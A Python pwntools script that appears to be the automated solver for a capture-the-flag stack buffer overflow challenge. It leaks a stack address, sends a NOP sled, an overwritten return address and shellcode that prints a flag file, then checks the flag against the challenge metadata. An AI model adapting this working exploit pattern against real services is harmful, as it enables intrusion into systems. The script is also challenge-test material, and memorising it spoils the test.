#!/usr/bin/python3
import argparse
import logging
import yaml
from pwn import p32, shellcraft, remote, asm, process
from pathlib import Path

logger = logging.getLogger("secretary")

HERE = Path(__file__).parent
FLAG = yaml.safe_load(open(HERE / "meta.yml"))["flags"]


def solve(sh):
    stack_addr = sh.recvline().strip().split()[-1]
    logger.info(f"Buffer addr: {stack_addr.decode()}")
    padding = b"\x90" * 500
    EIP = p32(int(stack_addr, 16) + 4 + len(padding))
    shellcode = asm(
        shellcraft.linux.cat("/src/flag.txt")
    )  # Note that flag has to be located here otherwise you are going to get an error
    payload = padding + EIP + shellcode
    sh.sendline(payload)
    logger.info("Payload sent!")
    flag = sh.recvuntil(b"}\n").decode()
    assert FLAG in flag, flag


def test(domain, port):
    sh = remote(domain, port)
    solve(sh)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-r", action="store_true")
    parser.add_argument("domain", default="0.0.0.0", nargs="?")
    parser.add_argument("port", default=1337, type=int, nargs="?")
    args = parser.parse_args()
    if args.r:
        test(args.domain, args.port)
    else:
        sh = process("./chal/90-s")
        solve(sh)
